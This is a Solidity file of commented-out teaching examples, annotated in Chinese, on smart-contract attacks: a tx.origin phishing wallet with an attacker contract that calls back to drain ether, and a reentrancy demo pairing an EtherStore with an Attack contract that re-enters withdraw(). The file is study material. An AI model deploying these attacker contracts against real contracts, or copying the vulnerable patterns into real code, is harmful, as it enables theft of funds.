// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

/*
tx.origin 攻击

*/
// contract TxUserWallet {
//     event UserLog(uint256 gg);

//     address owner;

//     constructor() payable {
//         owner = msg.sender;
//     }

//     function transferTo(address payable dest, uint amount) external payable{
//         require(tx.origin == owner);
//         emit UserLog(gasleft());
//         // dest.transfer(amount);
//         // dest.call{value: amount, gas: 2300}("");
//         // 以上两种情况会因为gas携带不够不能完全执行
//         dest.call{value: amount}("");
//     }

//     function getBalance() public view returns(uint) {
//         uint _balance = address(this).balance;
//         return _balance;
//     }
// }

// interface InterfaceUserWallet {
//     function transferTo(address payable dest, uint amount) external payable;
// }

// contract TxAttackWallet {
//     event AttackLog(uint256 gg);

//     address payable owner;

//     constructor() payable {
//         owner = payable(msg.sender);
//     }

//     receive() external payable {
//         emit AttackLog(gasleft());
//         InterfaceUserWallet(msg.sender).transferTo(payable(address(this)), 1 ether);
//     }

//     function getBalance() public view returns(uint) {
//         uint _balance = address(this).balance;
//         return _balance;
//     }
// }

/*
重入攻击
使用重入锁 或者 先改变状态值来防范
*/


// contract EtherStore {
//     mapping(address => uint) public balances;

//     // 重入锁
//     bool internal locked;

//     modifier noReentrant() {
//         require(!locked, "No re-entrancy");
//         locked = true;
//         _;
//         locked = false;
//     }

//     function deposit() public payable {
//         balances[msg.sender] += msg.value;
//     }

//     function withdraw() public noReentrant {
//         uint bal = balances[msg.sender];
//         require(bal > 0);

//         (bool sent, ) = msg.sender.call{value: bal}("");
//         require(sent, "Failed to send Ether");

//         balances[msg.sender] = 0;
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }

// contract Attack {
//     EtherStore public etherStore;

//     constructor(address _etherStoreAddress) {
//         etherStore = EtherStore(_etherStoreAddress);
//     }
    
//     // Fallback is called when EtherStore sends Ether to this contract.
//     fallback() external payable {
//         if (address(etherStore).balance >= 1 ether) {
//             etherStore.withdraw();
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= 1 ether);
//         etherStore.deposit{value: 1 ether}();
//         etherStore.withdraw();
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }

/*
数学溢出
*/